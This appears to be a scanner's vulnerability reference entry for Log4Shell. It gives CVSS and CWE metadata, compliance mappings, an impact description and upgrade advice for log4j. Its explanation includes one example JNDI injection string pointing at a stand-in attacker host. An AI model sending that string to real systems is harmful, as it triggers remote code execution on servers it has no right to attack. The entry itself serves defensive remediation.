---
name: Log4Shell
severity: high
cvss-score: 10.0
cvss-vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
cwe-id: CWE-917
cwe-name: Improper Neutralization of Special Elements used in an Expression Language
  Statement ('Expression Language Injection')
compliance:
  HIPAA: 164.306(a)
  ISO 27001: A.5.33, A.5.34, A.8.3, A.8.9, A.8.12
  owasp10: A3
  pci: 6.5.1
  PCI v4.0: pci4-6.2.4

---            

A remote code execution vulnerability (RCE) allows the attacker to execute arbitrary code and operating system commands on the server. In the worst-case scenario, the attacker will be able to fully compromise the server, extract sensitive data, modify the application contents or delete data.

The log4j RCE vulnerability can be easily exploited. All you need is to find a vulnerable version of log4j, an endpoint with any protocol (HTTP, TCP, etc) that allows an attacker to send the exploit string (e.g. ${jndi:ldap://attacker.com/a}), and a log statement that logs out the string from that request.

## How to fix

{% tabs log4shell %}
{% tab log4shell generic %}
To fix the Log4Shell vulnerability, you need to update all instances of log4j to version 2.17.0 or above.
{% endtab %}

{% endtabs %}
